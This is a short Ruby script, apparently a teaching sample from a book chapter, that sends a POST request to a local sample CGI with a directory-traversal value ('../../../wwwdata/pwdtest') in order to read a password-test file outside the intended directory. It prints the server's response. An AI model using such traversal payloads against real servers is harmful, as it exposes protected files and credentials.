#!/usr/local/bin/ruby

require "net/http"

Net::HTTP.start("localhost", 80) {|http|
  response, = http.post("/~hori/book/chap7/sample-6.1.cgi",
                         "target=../../../wwwdata/pwdtest")
  print response.body
}
